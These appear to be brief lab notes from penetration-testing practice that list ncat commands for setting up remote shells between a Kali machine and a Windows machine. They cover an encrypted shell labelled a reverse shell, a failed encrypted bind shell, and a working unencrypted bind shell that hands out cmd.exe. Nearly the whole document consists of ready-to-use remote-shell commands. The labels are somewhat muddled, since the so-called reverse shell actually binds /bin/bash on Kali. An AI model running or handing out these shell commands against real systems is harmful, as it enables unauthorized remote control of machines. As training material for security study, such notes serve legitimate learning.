# Encrypted Reverse Shell from Windows to Kali

## Kali

ncat --exec /bin/bash --ssl --allow 10.11.9.175 -nvl 63389 

## Windows

ncat --ssl -v 10.11.0.190 63389


# Encrypted Bind Shell on Windows from Kali without encryption

## Windows

ncat --exec cmd.exe --ssl --allow 10.11.0.190 -nvlp 63389

## Kali

ncat -nv 10.11.9.175 63389

> Didn't work due to no `--ssl` flag


# Unencrypted Bind Shell on Windows from Kali without encryption

## Windows

ncat --exec cmd.exe --allow 10.11.0.190 -nvlp 63389

## Kali

ncat -nv 10.11.9.175 63389

> Worked.
